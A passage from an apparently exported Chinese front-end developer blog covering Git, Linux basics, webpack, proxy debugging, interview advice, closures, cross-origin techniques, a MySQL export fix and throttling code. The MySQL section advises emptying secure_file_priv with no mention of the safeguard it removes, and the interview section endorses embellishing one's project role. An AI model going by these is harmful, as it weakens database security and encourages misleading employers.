&lt;branchname&gt;，运行git branch可以看到本地所有的分支名称。 自己的分支，如果想同步master分支的内容，可运行git merge master。切换分支可使用git checkout &lt;branchname&gt;。 在自己的分支上修改了内容，可以将自己的分支提交到远程服务器 git add . git commit -m &quot;xxx&quot; git push origin &lt;branchname&gt; 复制 最后，待代码测试没问题，再将自己分支的内容合并到master分支，然后提交到远程服务器。 git checkout master git merge &lt;branchname&gt; git push origin master 复制 关于 SVN 关于 SVN 笔者的态度和针对 IE 低版本浏览器的态度一样，你只需要查询资料简单了解一下。面试的时候可能会问到，但你只要熟悉了 Git 的操作，面试官不会因为你不熟悉 SVN 而难为你。前提是你要知道一点 SVN 的基本命令，自己上网一查就行。 不过 SVN 和 Git 的区别你得了解。SVN 是每一步操作都离不开服务器，创建分支、提交代码都需要连接服务器。而 Git 就不一样了，你可以在本地创建分支、提交代码，最后再一起 push 到服务器上。因此，Git 拥有 SVN 的所有功能，但是却比 SVN 强大得多。（Git 是 Linux 的创始人 Linus 发明的东西，因此也倍得推崇。） Linux 基础命令 目前互联网公司的线上服务器都使用 Linux 系统，测试环境为了保证和线上一致，肯定也是使用 Linux 系统，而且都是命令行的，没有桌面，不能用鼠标操作。因此，掌握基础的 Linux 命令是非常必要的。下面总结一些最常用的 Linux 命令，建议大家在真实的 Linux 系统下亲自试一下。 关于如何得到 Linux 系统，有两种选择：第一，在自己电脑的虚拟机中安装一个 Linux 系统，例如 Ubuntu/CentOS 等，下载这些都不用花钱；第二，花钱去阿里云等云服务商租一个最便宜的 Linux 虚拟机。推荐第二种。一般正式入职之后，公司都会给你分配开发机或者测试机，给你账号和密码，你自己可以远程登录。 题目：常见 linux 命令有哪些？ 登录 入职之后，一般会有现有的用户名和密码给你，你拿来之后直接登录就行。运行 ssh name@server 然后输入密码即可登录。 目录操作 创建目录 mkdir &lt;目录名称&gt; 删除目录 rm &lt;目录名称&gt; 定位目录 cd &lt;目录名称&gt; 查看目录文件 ls``ll 修改目录名 mv &lt;目录名称&gt; &lt;新目录名称&gt; 拷贝目录 cp &lt;目录名称&gt; &lt;新目录名称&gt; 文件操作 创建文件 touch &lt;文件名称&gt;``vi &lt;文件名称&gt; 删除文件 rm &lt;文件名称&gt; 修改文件名 mv &lt;文件名称&gt; &lt;新文件名称&gt; 拷贝文件 cp &lt;文件名称&gt; &lt;新文件名称&gt; 文件内容操作 查看文件 cat &lt;文件名称&gt;``head &lt;文件名称&gt;``tail &lt;文件名称&gt; 编辑文件内容 vi &lt;文件名称&gt; 查找文件内容 grep '关键字' &lt;文件名称&gt; 前端构建工具 构建工具是前端工程化中不可缺少的一环，非常重要，而在面试中却有其特殊性 —— 面试官会通过询问构建工具的作用、目的来询问你对构建工具的了解，只要这些你都知道，不会再追问细节。因为，在实际工作中，真正能让你编写构建工具配置文件的机会非常少，一个项目就配置一次，后面就很少改动了。而且，如果是大众使用的框架（如 React、Vue 等），还会直接有现成的脚手架工具，一键创建开发环境，不用手动配置。 题目：前端为何要使用构建工具？它解决了什么问题？ 何为构建工具 “构建”也可理解为“编译”，就是将开发环境的代码转换成运行环境代码的过程。开发环境的代码是为了更好地阅读，而运行环境的代码是为了更快地执行，两者目的不一样，因此代码形式也不一样。例如，开发环境写的 JS 代码，要通过混淆压缩之后才能放在线上运行，因为这样代码体积更小，而且对代码执行不会有任何影响。总结一下需要构建工具处理的几种情况： 处理模块化：CSS 和 JS 的模块化语法，目前都无法被浏览器兼容。因此，开发环境可以使用既定的模块化语法，但是需要构建工具将模块化语法编译为浏览器可识别形式。例如，使用 webpack、Rollup 等处理 JS 模块化。 编译语法：编写 CSS 时使用 Less、Sass，编写 JS 时使用 ES6、TypeScript 等。这些标准目前也都无法被浏览器兼容，因此需要构建工具编译，例如使用 Babel 编译 ES6 语法。 代码压缩：将 CSS、JS 代码混淆压缩，为了让代码体积更小，加载更快。 构建工具介绍 最早普及使用的构建工具是 Grunt ，不久又被 Gulp 给追赶上。Gulp 因其简单的配置以及高效的性能而被大家所接受，也是笔者个人比较推荐的构建工具之一。如果你做一些简单的 JS 开发，可以考虑使用。 如果你的项目比较复杂，而且是多人开发，那么你就需要掌握目前构建工具届的神器 —— webpack 。不过神器也有一个缺点，就是学习成本比较高，需要拿出专门的时间来专心学习，而不是三言两语就能讲完的。我们下面就演示一下 webpack 最简单的使用，全面的学习还得靠大家去认真查阅相关文档，或者参考专门讲解 webpack 的教程。 webpack 演示 接下来我们演示一下 webpack 处理模块化和混淆压缩代码这两个基本功能。 首先，你需要安装 Node.js，没有安装的可以去 Node.js 官网 下载并安装。安装完成后运行如下命令来验证是否安装成功。 node -v npm -v 复制 然后，新建一个目录，进入该目录，运行npm init，按照提示输入名称、版本、描述等信息。完成之后，该目录下出现了一个package.json文件，是一个 JSON 文件。 接下来，安装 wepback，运行npm i --save-dev webpack，网络原因需要耐心等待几分钟。 接下来，编写源代码，在该目录下创建src文件夹，并在其中创建app.js和dt.js两个文件，文件内容分别是： // dt.js 内容 module.exports = &#123; getDateNow: function () &#123; return Date.now() &#125; &#125; // app.js 内容 var dt = require('./dt.js') alert(dt.getDateNow()) 复制 然后，再返回上一层目录，新建index.html文件（该文件和src属于同一层级），内容是 &lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;test&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;div&gt;test&lt;/div&gt; &lt;script src='./dist/bundle.js'&gt;&lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 复制 然后，编写 webpack 配置文件，新建webpack.config.js，内容是 const path = require('path'); const webpack = require('webpack'); module.exports = &#123; context: path.resolve(__dirname, './src'), entry: &#123; app: './app.js', &#125;, output: &#123; path: path.resolve(__dirname, './dist'), filename: 'bundle.js', &#125;, plugins: [ new webpack.optimize.UglifyJsPlugin(&#123; compress: &#123; //supresses warnings, usually from module minification warnings: false &#125; &#125;), ] &#125;; 复制 总结一下，目前项目的文件目录是： src +-- app.js +-- dt.js index.html package.json webpack.config.js 复制 接下来，打开package.json，然后修改其中scripts的内容为： &quot;scripts&quot;: &#123; &quot;start&quot;: &quot;webpack&quot; &#125; 复制 在命令行中运行npm start，即可看到编译的结果，最后在浏览器中打开index.html，即可弹出Date.now()的值。 总结 最后再次强调，深刻理解构建工具存在的价值，比你多会一些配置代码更加有意义，特别是对于应对面试来说。 调试方法 调试方法这块被考查最多的就是如何进行抓包。 题目：如何抓取数据？如何使用工具来配置代理？ PC 端的网页，我们可以通过 Chrome、Firefox 等浏览器自带的开发者工具来查看网页的所有网络请求，以帮助排查 bug。这种监听、查看网络请求的操作称为抓包。 针对移动端的抓包工具，Mac 系统下推荐使用 Charles 这个工具，首先 下载 并安装，打开。Windows 系统推荐使用 Fiddler，下载安装打开。两者使用基本一致，下面以 Charles 为例介绍。 接下来，将安装好 Charles 的电脑和要抓包的手机，连接到同一个网络（一般为公司统一提供的内网，由专业网络工程师搭建），保证 IP 段相同。然后，将手机设置网络代理（每种不同手机如何设置网络代理，网上都有傻瓜式教程），代理的 IP 为电脑的 IP，代理的端口为8888。然后，Charles 可能会有一个弹框提示是否允许连接代理，这里选择“允许”即可。这样，使用手机端访问的网页或者联网的请求，Charles 就能监听到了。 在开发过程中，经常用到抓包工具来做代理，将线上的地址代理到测试环境，Charles 和 Fiddler 都可实现这个功能。以 Charles 为例，点击菜单栏中 Tools 菜单，然后二级菜单中点击 Map Remote，会弹出配置框。首先，选中 Enable Map Remote 复选框，然后点击 Add 按钮，添加一个代理项。例如，如果要将线上的https://www.aaa.com/api/getuser?name=xxx这个地址代理到测试地址http://168.1.1.100:8080/api/getuser?name=xxx，配置如下图 ![](data:image/svg+xml;utf8,) 小结 本小节总结了前端开发环境常考查的知识，这些知识也是前端程序员必须掌握的，否则会影响开发效率。 上一篇：一面 5：浏览器相关知识点与高频考题解析下一篇：二面 1：如何回答常见的软技能问题 二面 1：如何回答常见的软技能问题 面试是个技术活，不仅仅是技术，各种软技能的面试技巧也是非常重要的，尤其是程序员一般对于自己的软技能不是很看重，其实软技能才是决定你职场能够走多远的关键。 程序员应该具备的软技能 程序员除了业务技能外，应该具有下面的软技能： 韧性：抗压能力，在一定项目压力下能够迎难而上，比如勇于主动承担和解决技术难题 责任心：对于自己做过的项目，能够出现 bug 之类主动解决 持续学习能力：IT 行业是个需要不断充电的行业，尤其 Web 前端这些年一直在巨变，所以持续学习能力很重要 团队合作能力：做项目不能个人英雄主义，应该融入团队，跟团队一起打仗 交流沟通能力：经常会遇见沟通需求和交互设计的工作，应该乐于沟通分享 另外在《软技能：代码之外的生存指南》这本书里提到了下面一些软技能： 职业 自我营销 学习能力 提升工作效率 理财 健身 积极的人生观 常见的软技能问题和提升 回答软技能类的问题，应该注意在回答过程中体现自己具备的软技能。下面列举几个常见的软技能类的问题。 回想下你遇见过最难打交道的同事，你是如何跟他沟通的 一般来说，工作中总会遇见一两个自己不喜欢的人，这种情况应该尽量避免冲突，从自己做起慢慢让对方感觉到自己的合作精神。 所以，遇见难打交道的同事，不要急于上报领导，应该自己主动多做一些事情，比如规划好工作安排，让他选择自己做的事情，有了结论记得发邮件确认下来，这样你们的领导和其他成员都会了解到工作的安排，在鞭笞对方的同时，也做到了职责明确。在项目当中，多主动检查项目进展，提前发现逾期的问题。 重点是突出：自己主动沟通解决问题的意识，而不是遇见问题就找领导。 当你被分配一个几乎不可能完成的任务时，你会怎么做 这种情况下，一般通过下面方式来解决： 自己先查找资料，寻找解决方案，评估自己需要怎样的资源来完成，需要多长时间 能不能借助周围同事来解决问题 拿着分析结果跟上级反馈，寻求帮助或者资源 突出的软技能：分析和解决问题，沟通寻求帮助。 业余时间都做什么？除了写码之外还有什么爱好 这类问题也是面试官的高频问题，「一个人的业余时间决定了他的未来」，如果回答周末都在追剧打游戏之类的，未免显得太不上进。 一般来说，推荐下面的回答： 周末一般会有三种状态： 和朋友一起去做做运动，也会聚会聊天，探讨下新技术之类的； 也会看一些书籍充充电，比如我最近看的 xx，有什么的想法； 有时候会闷在家用最近比较火的技术做个小项目或者实现个小功能之类的。 这样的回答，既能表现自己阳光善于社交沟通的一面，又能表现自己的上进心。 小结 本小节介绍了程序员除了业务技术能力之外应该日常修炼的软技能，在面试中，软技能会被以各种形式问起，候选人应该先了解有哪些软技能可以修炼，才能在回答软技能问题的时候，尽量提到自己具备的软技能。 上一篇：一面 6：开发环境相关知识点与高频考题解析下一篇：二面 2：如何介绍项目及应对项目细节追问 二面 2：如何介绍项目及应对项目细节追问 一个标准的面试流程中，肯定会在一面二面中问到你具体做过的项目，然后追问项目的细节。这类问题往往会通过下面形式来提问： 发现你简历的一个项目，直接让你介绍下这个项目 让你回忆下你做过的项目中，最值得分享（最大型/最困难/最能体现技术能力/最难忘）的 如果让你设计 xx 系统/项目，你会怎么着手干 这类跟项目相关的综合性问题，既能体现候选人的技术水平、业务水平和架构能力，也能够辨别候选人是不是真的做过项目，还能够发现候选人的一些软技能。 下面分享下，遇见这类问题应该怎样回答。 怎样介绍自己做过的一个项目 按照第 1 小节说的，简历当中的项目，你要精挑细选，既要体现技术难度，又要想好细节。具体要介绍一个项目（包括梳理一个项目），可以按照下面几个阶段来做。 ###** 1. 介绍项目背景** 这个项目为什么做，当初大的环境背景是什么？还是为了解决一个什么问题而设立的项目？背景是很重要的，如果不了解背景，一上来就听一个结论性的项目，面试官可能对于项目的技术选型、技术难度会有理解偏差，甚至怀疑是否真的有过这样的项目。 比如一上来就说：我们的项目采用了「backbone」来做框架，然后。。。而「backbone」已经是三四年前比较新鲜的技术，现在会有更好的选择方案，如果不介绍项目的时间背景，面试官肯定一脸懵逼。 2. 承担角色 项目涉及的人员角色有哪些，自己在其中扮演的角色是什么？ 这里候选往往人会自己给自己挖坑，比如把自己在项目中起到的作用夸大等。一般来说，面试官细节追问的时候，如果候选人能够把细节或者技术方案等讲明白、讲清楚，不管他是真的做过还是跟别人做过，或者自己认真思考过，都能体现候选人的技术水平和技术视野。前提还是在你能够兜得住的可控范围之内做适当的「美化」。 3. 最终的结果和收益 项目介绍过程中，应该介绍项目最终的结果和收益，比如项目最后经过多久的开发上线了，上线后的数据是怎样的，是否达到预期，还是带来了新的问题，遇见了问题自己后续又是怎样补救的。 4. 有始有终：项目总结和反思 有总结和反思，才会有进步。 项目做完了往往会有一些心得和体会，这时候应该跟面试官说出来。在梳理项目的总结和反思时，可以按照下面的列表来梳理： 收获有哪些？ 是否有做得不足的地方，怎么改进？ 是否具有可迁移性？ 比如，之前详细介绍了某个项目，这个项目当时看来没有什么问题，但是现在有更好的解决方案了，候选人就应该在这里提出来：现在看来，这个项目还有 xx 的问题，我可以通过 xx 的方式来解决。 再比如：做这个项目的时候，你做得比较出彩的地方，可以迁移到其他项目中直接使用，小到代码片段，大到解决方案，总会有你值得总结和梳理的地方。 介绍完项目总结这部分，也可以引导面试官往自己擅长的领域思考。比如上面提到项目中的问题，可以往你擅长的方面引导，即使面试官没有问到，你也介绍到了。 按照上面的四段体介绍项目，会让面试官感觉候选人有清晰的思路，对整个项目也有理解和想法，还能够总结反思项目的收益和问题，可谓「一箭三雕」。 没有做过大型项目怎么办 对于刚刚找工作的应届生，或者面试官让你进行一个大型项目的设计，候选人可能没有类似的经验。这时候不要用「我不会、没做过」一句话就带过。 如果是实在没有项目可以说，那么可以提自己日常做的练手项目，或者看到一个解决方案的文章/书，提到的某个项目，抒发下自己的想法。 如果是对于面试官提出来需要你设计的项目/系统，可以按照下面几步思考： 有没有遇见过类似的项目 有没有读过类似解决方案的文章 项目能不能拆解，拆解过程中能不能发现自己做过的项目可以用 项目解决的问题是什么，这类问题有没有更好的解决方案 总之，切记不要一句「不知道、没做过」就放弃，每一次提问都是自己表现的机会。 项目细节和技术点的追问 介绍项目的过程中，面试官可能会追问技术细节，所以我们在准备面试的时候，应该尽量把技术细节梳理清楚，技术细节包括： 技术选型方案：当时做技术选型所面临的状况 技术解决方案：最终确定某种技术方案的原因，比如：选择用 Vue 而没有用 React 是为什么？ 项目数据和收益 项目中最难的地方 遇见的坑：如使用某种框架遇见哪些坑 一般来说，做技术选型的时候需要考虑下面几个因素： 时代：现在比较火的技术是什么，为什么火起来，解决了什么问题，能否用到我的项目中？ 团队：个人或者团队对某种技术的熟悉程度是怎样的，学习成本又是怎样的？ 业务需求：需求是怎样的，能否套用现在的成熟解决方案/库来快速解决？ 维护成本：一个解决方案的是否再能够 cover 住的范围之内？ 在项目中遇见的数据和收益应该做好跟踪，保证数据的真实性和可信性。另外，遇见的坑可能是面试官问得比较多的，尤其现在比较火的一些技术（Vue、React、webpack），一般团队都在使用，所以一定要提前准备下。 小结 本小节介绍了面试中关于项目类问题的回答方法，介绍项目要使用四段体的方式，从背景、承担角色、收益效果和总结反思四个部分来介绍项目。 准备这个面试环节的时候，利用笔者一直提倡的「思维导图」法，好好回顾和梳理自己的项目。","categories":[],"tags":[]},{"title":"javascript-闭包","slug":"javascript-闭包","date":"2019-01-10T02:56:47.000Z","updated":"2023-02-23T03:30:13.097Z","comments":true,"path":"2019/01/10/javascript-闭包/","link":"","permalink":"https://harrypangpang.github.io/2019/01/10/javascript-%E9%97%AD%E5%8C%85/","excerpt":"","text":"闭包的作用: 1.封装变量 2.延续局部变量的寿命 3.闭包和面向对象设计:实现私有数据和方法的封装(本质还是1,封装变量) 闭包能使局部变量的生命期延长,这点与全局作用域的变量是一致的,不能算是内存泄漏! 闭包与内存泄漏有关的部分是: 使用闭包容易造成循环引用,如果闭包的作用域中保存着一些DOM节点,这时候有可能造成内存泄漏(互相引用导致内存无法释放) 举例： // 例1： var increment = function () &#123; var count = 1; return &#123; inc: function () &#123; return count++; &#125; &#125; &#125; console.log(increment.count); //undefined var counter = increment(); console.log(counter.inc()); //1 console.log(counter.inc()); //2 console.log(counter.inc()); //3 var counter2 = increment(); console.log(counter2.inc()); //1 console.log(counter == counter2); //false,注:闭包每次返回的对象都不一样! // 例2 var getTypeChecker = function () &#123; var types = &#123;&#125;; for (var i = 0, type; type = [&#x27;String&#x27;, &#x27;Number&#x27;, &#x27;Array&#x27;][i++];) &#123; //使用闭包来封闭每次循环的变量 (function (type) &#123; types[&#x27;is&#x27; + type] = function (obj) &#123; return Object.prototype.toString.call(obj) === &#x27;[object &#x27; + type + &#x27;]&#x27;; &#125; &#125;)(type); &#125; return types; &#125; var checker = getTypeChecker(); console.log(checker.isArray([])); // true console.log(checker.isString([])); //false console.log(checker.isString(&#x27;hello&#x27;)); //true","categories":[],"tags":[]},{"title":"函数柯里化（curry)","slug":"函数柯里化","date":"2019-01-10T02:34:05.000Z","updated":"2023-02-23T03:30:13.098Z","comments":true,"path":"2019/01/10/函数柯里化/","link":"","permalink":"https://harrypangpang.github.io/2019/01/10/%E5%87%BD%E6%95%B0%E6%9F%AF%E9%87%8C%E5%8C%96/","excerpt":"","text":"函数柯里化的概念很简单，其实就是只提前接受一部分参数，但不执行结果，而是返回一个可以接受另一部分参数的函数。 你可以像下面一样，一次性的调用curry函数，返回每次只传一次参数，传两次来获得想要的结果 function MathSumA(x)&#123; return function MathSumB(y)&#123; return x+y &#125; &#125; // 先传如一个x=2 let x = MathSumA(2); // 再传入一个y=10 let result = x(10); //result = x+y =2+10 =12","categories":[],"tags":[]},{"title":"javascript跨域","slug":"javascript跨域","date":"2019-01-09T13:11:52.000Z","updated":"2023-02-23T03:30:13.097Z","comments":true,"path":"2019/01/09/javascript跨域/","link":"","permalink":"https://harrypangpang.github.io/2019/01/09/javascript%E8%B7%A8%E5%9F%9F/","excerpt":"","text":"什么是跨域？ 概念：只要协议、域名、端口有任何一个不同，都被当作是不同的域。 比如下面四个，都会存在跨域的问题 https://www.baidu.com:8080 http://www.baidu.com:8080 https://www.m.baidu.com:8080 https://www.m.baidu.com:4000 如何解决跨域问题 1.JSONP： 原理是：动态插入script标签，通过script标签引入一个js文件，这个js文件载入成功后会执行我们在url参数中指定的函数，并且会把我们需要的json数据作为参数传入。 由于同源策略的限制，XmlHttpRequest只允许请求当前源（域名、协议、端口）的资源，为了实现跨域请求，可以通过script标签实现跨域请求，然后在服务端输出JSON数据并执行回调函数，从而解决了跨域的数据请求。 优点是兼容性好，简单易用，支持浏览器与服务器双向通信。缺点是只支持GET请求。 JSONP：json+padding（内填充），顾名思义，就是把JSON填充到一个盒子里 &lt;script&gt; function createJs(sUrl)&#123; var oScript = document.createElement(&#x27;script&#x27;); oScript.type = &#x27;text/javascript&#x27;; oScript.src = sUrl; document.getElementsByTagName(&#x27;head&#x27;)[0].appendChild(oScript); &#125; createJs(&#x27;jsonp.js&#x27;); box(&#123; &#x27;name&#x27;: &#x27;test&#x27; &#125;); function box(json)&#123; alert(json.name); &#125; &lt;/script&gt; 2.CORS 服务器端对于CORS的支持，主要就是通过设置Access-Control-Allow-Origin来进行的。 如果浏览器检测到相应的设置，就可以允许Ajax进行跨域的访问。 3.通过修改DOCUMENT.DOMAIN来跨子域 将子域和主域的document.domain设为同一个主域.前提条件：这两个域名必须属于同一个基础域名!而且所用的协议，端口都要一致， 否则无法利用document.domain进行跨域,主域相同的使用document.domain 4.使用WINDOW.NAME来进行跨域 window对象有个name属性，该属性有个特征：即在一个窗口(window)的生命周期内,窗口载入的所有的页面都是共享一个window.name的， 每个页面对window.name都有读写的权限，window.name是持久存在一个窗口载入过的所有页面中的 5.使用HTML5中新引进的WINDOW.POSTMESSAGE方法来跨域传送数据 6.还有FLASH、在服务器上设置代理页面等跨域方式。","categories":[],"tags":[]},{"title":"前端进阶学习路径","slug":"前端进阶学习路径","date":"2019-01-01T05:58:14.000Z","updated":"2023-02-23T03:30:13.099Z","comments":true,"path":"2019/01/01/前端进阶学习路径/","link":"","permalink":"https://harrypangpang.github.io/2019/01/01/%E5%89%8D%E7%AB%AF%E8%BF%9B%E9%98%B6%E5%AD%A6%E4%B9%A0%E8%B7%AF%E5%BE%84/","excerpt":"","text":"前端进阶学习路径这是引用自木易杨大佬的公众号（yygmind）传送门：https://github.com/yygmind/blog 这里只是我用来做目录，留着自己以后学习 【进阶1期】 调用堆栈 【进阶2期】 作用域闭包 【进阶3期】 this全面解析 【进阶4期】 深浅拷贝原理 【进阶5期】 原型Prototype 【进阶6期】 高阶函数 【进阶7期】 事件机制 【进阶8期】 Event Loop原理 【进阶9期】 Promise原理 【进阶10期】Async/Await原理 【进阶11期】防抖/节流原理 【进阶12期】模块化详解 【进阶13期】ES6重难点 【进阶14期】计算机网络概述 【进阶15期】浏览器渲染原理 【进阶16期】webpack配置 【进阶17期】webpack原理 【进阶18期】前端监控 【进阶19期】跨域和安全 【进阶20期】性能优化 【进阶21期】VirtualDom原理 【进阶22期】Diff算法 【进阶23期】MVVM双向绑定 【进阶24期】Vuex原理 【进阶25期】Redux原理 【进阶26期】路由原理 【进阶27期】VueRouter源码解析 【进阶28期】ReactRouter源码解析","categories":[],"tags":[]},{"title":"JavaScript执行环境-执行栈","slug":"JavaScript执行环境-执行栈","date":"2019-01-01T05:52:08.000Z","updated":"2023-02-23T03:30:13.095Z","comments":true,"path":"2019/01/01/JavaScript执行环境-执行栈/","link":"","permalink":"https://harrypangpang.github.io/2019/01/01/JavaScript%E6%89%A7%E8%A1%8C%E7%8E%AF%E5%A2%83-%E6%89%A7%E8%A1%8C%E6%A0%88/","excerpt":"","text":"#####1.1执行环境 执行环境可以简称为环境，可以理解为JS被解析和执行所在的外部环境。 #####1.1.1全局执行环境 全局执行环境是最外层的一个环境，根据宿主环境的不同，全局对象也会有所区别，比如在浏览器中全局环境是window，在node中全局环境就是这个文件的module对象。 #####1.1.2函数执行环境 每次调用一个函数时，都会创建一个新的执行环境，在这个函数内的任何声明都无法在该函数之外的地方访问 #####1.1.3Eval函数执行环境 在eval()函数中的代码，不建议使用 #####1.1.4 执行栈 我们先了解一下执行栈内的执行顺序：后进先出，意思就是最早来的最晚走，最后来的最先走（参考下图理解） 因为JavaScript在浏览器环境中的执行是单线程（就是一次只能做一件事，不能边吃饭边看电视，只能先吃饭再看电视），对于多个任务，只能采用任务队列的方式（就是先吃饭，一定要等吃完饭才能看电视）。 举一个例子（暂时不用去看current execution context这一层，其实就是Execution Context N+1）， 调用 一个函数f1，执行流先进入全局环境 （Global Execution Context这一层） f1的环境被推入环境栈中 （Execution Context N+1这一层按照绿色箭头进入） 这时候函数f1又调用了函数f2，f2的环境被推入环境栈中 （Execution Context N+2这一层按照绿色箭头进入） f2执行完之后就立马离开执行栈 Execution Context N+2这一层按照红箭头离开 f1执行完之后在f2离开环境栈后再离开环境栈 Execution Context N+1这一层按照红箭头离开 全局环境不会消失，除非关闭浏览器或者关闭网页所以Global Execution Context这一层不会消失 看到这里，我们就能理解另外一个概念：执行环境的两个阶段 ######1. 创建阶段 当函数被调用，但是为执行内部代码之前: 创建一个作用域链 创建变量，函数和参数。 确定this的值。 ######2, 执行阶段 赋值，引用函数，解释/执行代码。","categories":[],"tags":[]},{"title":"vue中AsyncAwait的使用示例","slug":"vue中AsyncAwait的使用示例","date":"2018-12-25T05:47:23.000Z","updated":"2023-02-23T03:30:13.097Z","comments":true,"path":"2018/12/25/vue中AsyncAwait的使用示例/","link":"","permalink":"https://harrypangpang.github.io/2018/12/25/vue%E4%B8%ADAsyncAwait%E7%9A%84%E4%BD%BF%E7%94%A8%E7%A4%BA%E4%BE%8B/","excerpt":"","text":"想要await按照预期来执行，就必须是promise methods: &#123; getAll() &#123; return new Promise((resolve, reject) =&gt; &#123; this.$axios.get(eventApi.getAllUsers).then(response =&gt; &#123; let a = response.data[0]; console.log(a); resolve(a); &#125;); &#125;); &#125;, getlog() &#123; return new Promise((resolve, reject) =&gt; &#123; console.log(&quot;111&quot;); resolve(&quot;111&quot;); &#125;); &#125;, getLog2() &#123; console.log(&quot;222&quot;); &#125;, getlog3() &#123; setTimeout(() =&gt; &#123; console.log(&quot;333&quot;); &#125;, 100); &#125;, getlog4() &#123; return new Promise((resolve, reject) =&gt; &#123; setTimeout(() =&gt; &#123; console.log(&quot;444&quot;); resolve(); &#125;, 1000); &#125;); &#125;, async getAllData() &#123; await this.getlog(); await this.getlog4(); await this.getAll(); await this.getlog3(); await this.getLog2(); &#125; 结果如下","categories":[],"tags":[]},{"title":"MySQL8.0.12--secure-file-priv数据导出问题解决","slug":"MySQL8-0-12-secure-file-priv数据导出问题解决","date":"2018-12-20T06:10:03.000Z","updated":"2023-02-23T03:30:13.095Z","comments":true,"path":"2018/12/20/MySQL8-0-12-secure-file-priv数据导出问题解决/","link":"","permalink":"https://harrypangpang.github.io/2018/12/20/MySQL8-0-12-secure-file-priv%E6%95%B0%E6%8D%AE%E5%AF%BC%E5%87%BA%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3/","excerpt":"","text":"想在mysql里导入和导出数据，因为navicat在万条以上数据导出时有概率会出现卡死，重启的状况，所有只能采用命令窗口里操作，但是苍天没饶过我 在mysql shell里面导入和导出时提示以下错误 The MySQL server is running with the --secure-file-priv option so it cannot execute this statement 别慌，我们能赢，在百度了诸多方案，在被像皮球一样踢来踢去中，我！终于找到了解决方案。下面开始： 进入mysql，输入 show global variables like &#x27;%secure%&#x27;; 看到如下 就是介个Null在不让我们导出数据 找到my.ini（我是windows.linux或者其他可能时my.conf）文件，新增一条 secure_file_priv= 记住，等于后后面别加东西比较稳 4.执行语句 select * into outfile &#x27;C:\\aaa.xlsx&#x27; FROM table1 WHERE name is null; 下个everything去寻找aaa.xlsx这个文件吧","categories":[],"tags":[]},{"title":"HTTP请求的四种方式区别","slug":"HTTP请求的四种方式区别","date":"2018-12-07T05:46:28.000Z","updated":"2023-02-23T03:30:13.095Z","comments":true,"path":"2018/12/07/HTTP请求的四种方式区别/","link":"","permalink":"https://harrypangpang.github.io/2018/12/07/HTTP%E8%AF%B7%E6%B1%82%E7%9A%84%E5%9B%9B%E7%A7%8D%E6%96%B9%E5%BC%8F%E5%8C%BA%E5%88%AB/","excerpt":"","text":"1：form-data 此时对应的 Content-Type:multipart/form-data; &lt;form action=&quot;$&#123;pageContext.request.contextPath&#125;/imageUpload_saveOrUpdate.action&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;div&gt; &lt;label&gt;请选择上传图片地址:&lt;/label&gt; &lt;input type=&quot;file&quot; name=&quot;image&quot;/&gt; &lt;/div&gt; &lt;/div&gt; &lt;div&gt; &lt;input type=&quot;submit&quot; value=&quot;上传&quot;/&gt; &lt;/div&gt; &lt;/form&gt; 它会将表单的数据处理为一条消息，以标签为单元，用分隔符分开。既可以上传键值对，也可以上传文件。当上传的字段是文件时，会有content-type来说明文件类型；content-disposition，用来说明字段的一些信息；由于有boundary隔离，所以multipart/form-data既可以上传文件，也可以上传键值对，它采用了键值对的方式，所以可以上传多个文件。 2：x-www-form-urlencoded 就是application/x-www-from-urlencoded,会将表单内的数据转换为键值对，比如,name=Java&amp;age = 23 3：raw 可以上传任意格式的文本，可以上传text、json、xml、html等 4：binary 相当于Content-Type:application/octet-stream,从字面意思得知，只可以上传二进制数据，通常用来上传文件，由于没有键值，所以，一次只能上传一个文件。 multipart/form-data与x-www-form-urlencoded区别 multipart/form-data：既可以上传文件等二进制数据，也可以上传表单键值对，只是最后会转化为一条信息； x-www-form-urlencoded：只能上传键值对，并且键值对都是间隔分开的。 参考[]","categories":[],"tags":[]},{"title":"函数节流与防抖","slug":"函数节流与防抖","date":"2018-11-10T03:10:09.000Z","updated":"2023-02-23T03:30:13.098Z","comments":true,"path":"2018/11/10/函数节流与防抖/","link":"","permalink":"https://harrypangpang.github.io/2018/11/10/%E5%87%BD%E6%95%B0%E8%8A%82%E6%B5%81%E4%B8%8E%E9%98%B2%E6%8A%96/","excerpt":"","text":"假设浏览器窗口滚动条滚动时会调用一个方法fn,下面一步步实现一个节流函数. * 第一个版本 * 缺点:产生了全局变量 &lt;script&gt; var timer; window.onscroll = function () &#123; clearTimeout(timer); timer = setTimeout(function () &#123; console.log(&#x27;window scroll...&#x27;); &#125;, 200); &#125; &lt;/script&gt; * 第二个版本,使用闭包来封装全局变量 * 缺点:如果用户不停的滚动滚动条,那么延时函数一次都不会触发 &lt;script&gt; var throttle = function (fn, delay) &#123; var timer = null; return function () &#123; clearTimeout(timer); timer = setTimeout(function () &#123; fn(); &#125;, delay); &#125; &#125; var f = throttle(testFn, 200); window.onscroll = function () &#123; f(); &#125;; &lt;/script&gt; * 于是我们又要添加一个功能：当用户触发 scroll 的时候应该 在某段时间 内至少触发一次，既然是在某段时间内， * 那么这个判断条件就可以取当前的时间毫秒数，每次函数调用把当前的时间和上一次调用时间相减，然后判断差值如果大于 某段时间 就直接触发， * 否则还是走 timeout 的延迟逻辑。 下面的代码里面需要指出的是： 1. previous 变量的作用和 timer 类似，都是记录上一次的标识，必须是相对的全局变量 2. 如果逻辑流程走的是“至少触发一次”的逻辑，那么函数调用完成需要把 previous 重置成当前时间，简单来说就是：相对于下一次的上一次其实就是当前 &lt;script&gt; var COUNT = 0, demo = document.getElementById(&#x27;demo&#x27;); function testFn() &#123; demo.innerHTML += &#x27;testFN 被调用了 &#x27; + ++COUNT + &#x27;次&lt;br&gt;&#x27;; &#125; var throttle = function (fn, delay, atleast) &#123; var timer = null; var previous = null; return function () &#123; var now = +new Date(); if (!previous) previous = now; if (atleast &amp;&amp; now - previous &gt; atleast) &#123; fn(); // 重置上一次开始时间为本次结束时间 previous = now; clearTimeout(timer); &#125; else &#123; clearTimeout(timer); timer = setTimeout(function () &#123; fn(); previous = null; &#125;, delay); &#125; &#125; &#125;; window.onscroll = throttle(testFn, 200); // window.onscroll = throttle(testFn, 500, 1000); &lt;/script&gt; &lt;script&gt; document.getElementById(&quot;btn&quot;).onclick = throttle(function () &#123; console.log(&quot;button 